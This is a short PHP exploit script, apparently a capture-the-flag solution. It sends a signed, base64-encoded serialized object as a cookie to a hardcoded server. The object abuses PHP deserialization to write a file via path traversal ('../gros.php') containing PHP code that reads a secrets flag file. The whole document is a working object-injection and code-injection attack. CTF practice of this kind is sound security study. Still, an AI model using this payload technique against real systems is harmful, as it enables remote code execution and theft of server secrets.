<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once "task/Signer.php";

$url = 'http://194.182.67.188:81/';
$signer = new Signer();

class Controller {
    public $gone = "byebye";
    public $ip = "../gros.php";
    public $the_time = "<?php echo file_get_contents('./secrets/flag2.txt'); ?>";
    public $is_admin = false;
}

$exploit = new Controller;
$data = serialize($exploit);
// $data = serialize(array("time" => "some time", "admin" => true, "ip" => "x"));

$payload = base64_encode($data) . "-" . $signer->sign($data);
echo $payload;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: track=".$payload));
curl_setopt($ch, CURLOPT_VERBOSE, true);
if(!curl_exec($ch)){
    die('Error: "' . curl_error($ch) . '" - Code: ' . curl_errno($ch));
}
else{
    $response = curl_exec($ch); 
}
curl_close($ch);
// var_dump($response);

?>